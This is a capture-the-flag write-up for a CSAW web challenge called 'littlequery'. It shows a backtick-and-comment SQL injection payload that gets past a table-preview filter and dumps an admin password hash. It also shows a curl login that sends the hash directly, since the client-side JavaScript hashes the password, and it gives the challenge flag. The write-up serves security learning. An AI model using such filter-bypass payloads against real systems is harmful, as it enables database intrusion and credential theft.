# Challenge

I've got a new website for BIG DATA analytics!

http://littlequery.chal.csaw.io

# Walkthrough/Solution

Viewing the source of the index page gave us a hint to this challenge:

```
<!--
<div class="col-md-4">
    <h2>For Developers</h2>
    <p>Check out our <a href="/api/db_explore.php">API</a></p>
</div>
-->
```
The php file `db_explore.php` allows us to specify a few modes to view information:

```
http://littlequery.chal.csaw.io/api/db_explore.php
Must specify mode={schema|preview}

http://littlequery.chal.csaw.io/api/db_explore.php?mode=schema
{"dbs":["littlequery"]}

http://littlequery.chal.csaw.io/api/db_explore.php?mode=schema&db=littlequery
{"tables":["user"]}

http://littlequery.chal.csaw.io/api/db_explore.php?mode=schema&db=littlequery&table=user
{"columns":{"uid":"int(11)","username":"varchar(128)","password":"varchar(40)"}}
```
However, it seemed that some filters are put in place to prevent us to read the contents of the database:
```
http://littlequery.chal.csaw.io/api/db_explore.php?mode=preview&db=littlequery&table=user
Database 'littlequery' is not allowed to be previewed.
```
After some experimentation, I found a working payload and the credentials of the user are shown:
```
http://littlequery.chal.csaw.io/api/db_explore.php?mode=preview&db=littlequery`/*&table=*/.`user
[{"uid":"1","username":"admin","password":"5896e92d38ee883cc09ad6f88df4934f6b074cf8"}]
```
Notice that there is a javascript that computes the input password to SHA1 before validating it at the backend:
```
http://littlequery.chal.csaw.io/js/login.js

$(".form-signin").submit(function () {
    var $password = $(this).find("input[type=password]");
    $password.val(CryptoJS.SHA1($password.val()).toString());
});
```
We can pass the credentials through `curl` so that the raw password is sent to the server directly.
```
curl -d 'username=admin&password=5896e92d38ee883cc09ad6f88df4934f6b074cf8' -X POST 'http://littlequery.chal.csaw.io/login.php' 
<rest of the headers are cut off for brevity>
```
With that, the flag is `flag{mayb3_1ts_t1m3_4_real_real_escape_string?}`

# Learning outcome
1. Bypassing filters applied on SQL statements
